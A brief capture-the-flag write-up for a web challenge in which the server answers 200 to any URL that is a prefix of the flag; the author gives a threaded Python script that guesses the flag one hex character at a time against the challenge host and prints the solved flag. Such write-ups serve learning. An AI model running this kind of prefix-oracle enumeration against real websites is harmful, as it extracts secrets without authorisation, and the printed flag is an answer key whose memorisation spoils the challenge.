The website returns 200 if you visit `/flag`. If you try and visit a gibberish site like `/flagasdfa` it returns 404. If you try to match the flag format `/flag{` you get 200 again. This means we should extract the flag character by character through the URL.

```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://buster.ctf.zone/"
flag = "flag{"
charset = "abcdef1234567890"

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

def test_char(c):
    attempt = flag + c
    try:
        r = session.get(URL + attempt, timeout=3)
        if r.status_code == 200:
            return c
    except requests.RequestException:
        pass
    return None

while len(flag) < 37:  # 5 chars 'flag{' + 32 hex + 1 '}'
    with ThreadPoolExecutor(max_workers=16) as executor:
        futures = {executor.submit(test_char, c): c for c in charset}
        for future in as_completed(futures):
            res = future.result()
            if res:
                flag += res
                print(flag)
                break

flag += "}"
print("Final flag:", flag)
```

Flag: `flag{deca3b962fc316a6d69a7e0c2c33c7fa}`

Solved by: benkyou